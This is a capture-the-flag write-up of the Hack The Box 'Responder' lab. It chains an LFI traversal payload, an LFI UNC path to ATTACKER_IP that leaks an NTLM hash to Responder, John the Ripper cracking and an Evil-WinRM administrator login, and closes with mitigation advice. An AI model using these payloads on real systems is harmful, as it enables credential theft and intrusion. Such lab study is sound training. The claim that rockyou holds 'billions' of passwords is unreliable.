# RESPONDER - Very Easy

**Date Completed:** January 30, 2026  
**Difficulty:** Very Easy  
**Status:** ✅ COMPLETE  
**Focus Areas:** LFI Vulnerability, NTLM Authentication, Responder Tool, Hash Cracking

---

## Phase 1: Initial Reconnaissance & Virtual Host Discovery

### Step 1: Initial Website Access Attempt
Navigating to `http://TARGET_IP` redirects to `http://unika.htb`:

```
HTTP/1.1 302 Found
Location: http://unika.htb/
```

**Problem:** The browser cannot resolve `unika.htb` - DNS lookup fails

**Root Cause:** Name-Based Virtual Hosting

### Step 2: Understanding Name-Based Virtual Hosting

**What is Name-Based Virtual Hosting?**
- A method for hosting multiple domain names on a single server
- Each domain receives separate handling and content
- Server resources (memory, CPU) are shared efficiently
- The webserver checks the `Host` header in HTTP requests
- Different domain names receive different content from the same IP

**How It Works:**
```
Client Request: GET / HTTP/1.1
                Host: unika.htb
                     ↓
Web Server receives Host header
                     ↓
Looks up configuration for "unika.htb"
                     ↓
Serves unika.htb-specific content
```

### Step 3: Resolving Virtual Hostname
To resolve `unika.htb`, we need to add it to our `/etc/hosts` file:

```bash
echo "TARGET_IP  unika.htb" | sudo tee -a /etc/hosts
```

**File Location:** `/etc/hosts`  
**Purpose:** Maps hostnames to IP addresses locally  
**Effect:** Browser will now resolve `unika.htb` and include `Host: unika.htb` in HTTP headers

### Step 4: Full Port Scan
While the virtual host is being resolved, let's scan for open ports:

```bash
nmap-full TARGET_IP
```

**Results:**

| Port | Service | Version | Status | Notes |
|------|---------|---------|--------|-------|
| 80 | HTTP | Apache | Open | Web server hosting unika.htb |
| 5985 | Microsoft HTTPAPI | WinRM | Open | Windows Remote Management |
| 7680 | Pando-pub | Unknown | Open | Potentially P2P service |

**Key Finding:** Multiple open ports indicate a Windows server with web services

---

## Phase 2: Web Application Enumeration

### Step 1: Accessing the Virtual Host
Now that `/etc/hosts` is configured:

```
http://unika.htb/
```

**Result:** Website loads successfully with 7 menu items

### Step 2: Website Structure Analysis
Exploring the site reveals:
- 6 standard menu items (Home, About, Services, Contact, etc.)
- **1 suspicious feature:** Language selection bar

### Step 3: URL Parameter Discovery
Selecting different languages reveals the vulnerability:

```
English:  http://unika.htb/index.php?page=english.htm
French:   http://unika.htb/index.php?page=french.htm
German:   http://unika.htb/index.php?page=german.htm
Spanish:  http://unika.htb/index.php?page=spanish.htm
```

**Critical Discovery:** The `page` parameter controls which file is included!

---

## Local File Inclusion (LFI) Vulnerability

### Understanding File Inclusion Vulnerabilities

**Dynamic Website Behavior:**
Dynamic websites include HTML pages on-the-fly using parameters from HTTP requests:
- GET parameters (`?page=french.htm`)
- POST parameters
- Cookies
- Environment variables

**Local File Inclusion (LFI):**
- Attacker can include files NOT intended by developers
- Uses `../` to traverse directories
- Access sensitive local files
- Potential for code execution in some cases

**Remote File Inclusion (RFI):**
- Similar to LFI but includes remote files
- Uses protocols like HTTP, FTP
- Loads external files from attacker-controlled servers

### Step 1: Testing LFI with Directory Traversal

The vulnerable `page` parameter uses `include()` method with no validation:

```php
// Vulnerable backend code
<?php
    include($_GET['page']);
?>
```

### Step 2: Accessing Windows System Files

Target file: `C:\Windows\System32\drivers\etc\hosts`

Exploit URL:
```
http://unika.htb/index.php?page=../../../../../../../windows/system32/drivers/etc/hosts
```

**How It Works:**
- Each `../` moves up one directory level
- Eventually reaches `C:\` (root)
- Then traverses down to `windows/system32/drivers/etc/hosts`
- The `include()` function loads the file
- File contents displayed in HTTP response

**Result:** ✅ LFI confirmed - we can read local files!

---

## Phase 3: NTLM Authentication & Responder Setup

### Understanding NTLM (New Technology LAN Manager)

**What is NTLM?**
- Microsoft authentication protocol collection
- Challenge-response authentication mechanism
- Type of Single Sign-On (SSO)
- Used in Active Directory domains
- User authenticates once, credentials cached

### NTLM Authentication Flow

```
1. Client → Server: Username + Domain Name

2. Server → Client: Random Challenge (16-byte string)

3. Client encrypts Challenge with NTLM hash of password
   Client → Server: Encrypted Challenge

4. Server retrieves user password hash from database

5. Server encrypts same Challenge with retrieved hash

6. Compare:
   ├─ IF Server's encryption == Client's encryption
   │  └─ ✅ Authentication successful
   └─ ELSE
      └─ ❌ Authentication failed
```

### Exploiting NTLM with SMB & Responder

**The Attack:**
1. Use LFI to make target access a remote SMB share
2. Target attempts to authenticate to our SMB server (Responder)
3. Responder captures the NTLM challenge-response
4. We get NetNTLMv2 hash without reversing it
5. Crack hash with John the Ripper using wordlist

### Step 1: Set Up Responder

Clone Responder repository:
```bash
git clone https://github.com/lgandx/Responder
cd Responder
```

Start malicious SMB server:
```bash
sudo python3 Responder.py -I tun0
```

**Flags:**
- `-I tun0` : Listen on VPN interface (where target can reach us)

**Responder listens for:**
- SMB authentication attempts
- HTTP authentication attempts
- FTP authentication attempts
- DNS queries

### Step 2: Trigger SMB Authentication via LFI

Craft LFI URL pointing to our SMB server:
```
http://unika.htb/index.php?page=//ATTACKER_IP/somefile
```

**What Happens:**
```
1. Browser requests page parameter
2. PHP tries to include //ATTACKER_IP/somefile
3. Server interprets as UNC path (SMB path)
4. Windows attempts SMB authentication to ATTACKER_IP
5. Server sends NTLM challenge-response
6. Responder captures and displays hash
```

### Step 3: Capture NetNTLMv2 Hash

Responder output:
```
[SMB] NTLMv2-SSP Client   : 10.129.x.x
[SMB] NTLMv2-SSP Username : UNIKA\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::UNIKA:01020000...
```

**Hash Format:**
```
Administrator::UNIKA:challenge:response
```

**Why NetNTLMv2 can't be reversed:**
- It's a one-way hash of (password + username + domain + challenge)
- No known algorithm to reverse it
- Must use dictionary attacks (John the Ripper, Hashcat)

---

## Phase 4: Hash Cracking with John the Ripper

### Step 1: Save Hash to File

Create file with captured hash:
```bash
nano hash2.txt
# Paste: Administrator::UNIKA:challenge:response...
# Save and exit
```

### Step 2: Locate Wordlist

Find rockyou.txt wordlist:
```bash
locate rockyou.txt
```

**Output:**
```
/usr/share/wordlists/rockyou.txt
```

### Step 3: Crack with John the Ripper

```bash
john -w=/usr/share/wordlists/rockyou.txt hash2.txt
```

**Process:**
- John reads each word from rockyou.txt
- Generates NetNTLMv2 hash for each word
- Compares against captured hash
- When match found: password displayed

**Result:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Password found: badminton
```

**Cracked Credentials:**
- Username: `Administrator`
- Password: `badminton`

---

## Phase 5: Windows Access via Evil-WinRM

### Understanding Evil-WinRM

**What is WinRM (Windows Remote Management)?**
- Microsoft remote management protocol
- Port 5985 (HTTP) / 5986 (HTTPS)
- Allows remote command execution
- Often enabled on Windows servers
- Credentials required

**Evil-WinRM:**
- Tool for Windows RDP-like access
- Uses WinRM protocol
- More reliable than RDP in some scenarios
- Supports file upload/download
- PowerShell remote execution

### Step 1: Review Nmap Results

From earlier scan, port 5985 is open:
```
5985/tcp open  wsman
```

This is WinRM - perfect for our credentials!

### Step 2: Connect with Evil-WinRM

```bash
evil-winrm -i TARGET_IP -u administrator -p badminton
```

**Options:**
- `-i TARGET_IP` : Target IP address
- `-u administrator` : Username (case-insensitive)
- `-p badminton` : Password we cracked

**Result:**
```
*Evil-WinRM* PS C:\Users\Administrator>
```

Connected shell to Windows machine!

### Step 3: Navigate to Flag

Windows shell commands:
```powershell
cd ..              # Move to parent directory
cd ..              # Move up to C:\
dir                # List directories and files
cd Users           # Enter Users directory
cd mike            # Enter mike user's home
cd Desktop         # Go to Desktop
dir                # List files
type flag.txt      # Display flag contents
```

**File Path:** `C:\Users\mike\Desktop\flag.txt`

**Flag Retrieved:** ✅

---

## Exploitation Timeline

| Step | Action | Details | Result |
|------|--------|---------|--------|
| 1 | DNS Resolution | Add unika.htb to /etc/hosts | Access website |
| 2 | Port Scan | nmap -sV -p- TARGET_IP | Found ports 80, 5985, 7680 |
| 3 | Web Enumeration | Discover page parameter | Found LFI vector |
| 4 | LFI Test | Access ../../../windows/system32/drivers/etc/hosts | Confirmed LFI |
| 5 | Responder Setup | git clone + python3 Responder.py | SMB server listening |
| 6 | Trigger Auth | Access //ATTACKER_IP/somefile via LFI | NTLM challenge-response |
| 7 | Hash Capture | Responder displays NetNTLMv2 hash | Hash saved to file |
| 8 | Hash Crack | john -w=rockyou.txt hash2.txt | Password: badminton |
| 9 | WinRM Access | evil-winrm -i TARGET_IP -u admin -p badminton | Shell access |
| 10 | Flag Location | Navigate to C:\Users\mike\Desktop\flag.txt | Flag retrieved ✅ |

---

## Commands Used

### DNS & Network Setup
```bash
# Add virtual host to hosts file
echo "TARGET_IP  unika.htb" | sudo tee -a /etc/hosts

# Verify addition
cat /etc/hosts
```

### Network Reconnaissance
```bash
# Full port scan
nmap -sS -sV -p- TARGET_IP

# Quick port scan with service detection
nmap-port TARGET_IP
```

### Responder Setup & Exploitation
```bash
# Clone Responder repository
git clone https://github.com/lgandx/Responder
cd Responder

# Start Responder SMB server (listen on VPN interface)
sudo python3 Responder.py -I tun0

# Trigger SMB auth via LFI (in browser)
http://unika.htb/index.php?page=//ATTACKER_IP/somefile
```

### Hash Cracking
```bash
# Find wordlist location
locate rockyou.txt

# Crack NetNTLMv2 hash with John
john -w=/usr/share/wordlists/rockyou.txt hash2.txt

# Show cracked passwords
john --show hash2.txt
```

### Windows Access
```bash
# Connect via Evil-WinRM
evil-winrm -i TARGET_IP -u administrator -p badminton

# Within Evil-WinRM shell
cd ..
dir
type C:\Users\mike\Desktop\flag.txt
```

---

## Key Learning Outcomes

✅ **Name-Based Virtual Hosting** - Understanding how /etc/hosts enables local development and testing

✅ **Local File Inclusion (LFI)** - Directory traversal with ../ sequences to escape intended directories

✅ **Windows File Paths** - Backslash vs forward slash in URLs (both work for traversal)

✅ **NTLM Authentication** - Challenge-response mechanism and why it's vulnerable to offline cracking

✅ **Responder Tool** - Setting up malicious SMB/HTTP/FTP servers to capture credentials

✅ **NetNTLMv2 Hashes** - Why they can't be reversed but can be cracked with wordlists

✅ **John the Ripper** - Dictionary attack against captured hashes

✅ **Evil-WinRM** - Alternative to RDP using WinRM protocol for remote access

✅ **Attack Chaining** - LFI → NTLM Capture → Hash Crack → Remote Access → Flag

---

## Real-World Implications

### Vulnerability Chain

**LFI + Unvalidated File Inclusion → NTLM Capture → Credential Compromise → System Access**

This box demonstrates how a single vulnerability (LFI) can lead to complete system compromise when combined with:
- Overly permissive file system access
- NTLM authentication over SMB
- Weak password policies

### Why This Matters

1. **LFI Prevention Critical** - Input validation is essential
2. **NTLM Over Untrusted Networks** - Never allow over internet
3. **File Permissions** - Limit access to sensitive files
4. **Strong Passwords** - Wordlists like rockyou.txt are massive but finite
5. **Network Segmentation** - Isolate administrative services

---

## Mitigation Strategies

### Preventing LFI
```php
// ❌ VULNERABLE - No validation
include($_GET['page']);

// ✅ SECURE - Whitelist approach
$allowed_pages = ['english.htm', 'french.htm', 'german.htm'];
if (in_array($_GET['page'], $allowed_pages)) {
    include($_GET['page']);
} else {
    die('Invalid page');
}

// ✅ SECURE - Path normalization
$page = realpath($_GET['page']);
$base_dir = realpath('./pages/');
if (strpos($page, $base_dir) === 0) {
    include($page);
}
```

### Preventing NTLM Over Network
1. **Disable NTLMv2 over untrusted networks** - Use Kerberos instead
2. **Require NTLMv2 signing** - Prevent relay attacks
3. **Implement NTLMv2 only** - Disable NTLMv1
4. **Use strong passwords** - Enforce complexity, length, history
5. **Enable SMB signing** - Prevent credential theft

### Windows RDP/WinRM Security
1. **Restrict port access** - Firewall rules to internal only
2. **Use strong credentials** - No dictionary words
3. **Enable MFA** - Additional authentication factor
4. **Monitor access logs** - Detect suspicious behavior
5. **Update systems** - Patch critical vulnerabilities

---

## Lessons Learned

✅ **Rest is productive** - Taking time off after intense work maintains focus and prevents burnout

✅ **Simple vulnerabilities chain together** - LFI alone wasn't the complete issue; it enabled credential capture

✅ **Protocol understanding is crucial** - Knowing NTLM mechanics helped exploit the attack

✅ **Responder is powerful** - A tool that demonstrates why you must control UNC path inputs

✅ **Wordlists are effective** - rockyou.txt contains billions of common passwords

✅ **Alternative access methods matter** - Evil-WinRM complemented by understanding WinRM port

✅ **Windows navigation is different** - PowerShell vs Linux shell commands, but logic is same

✅ **Multi-stage attacks are realistic** - Real penetration testing requires chaining multiple techniques

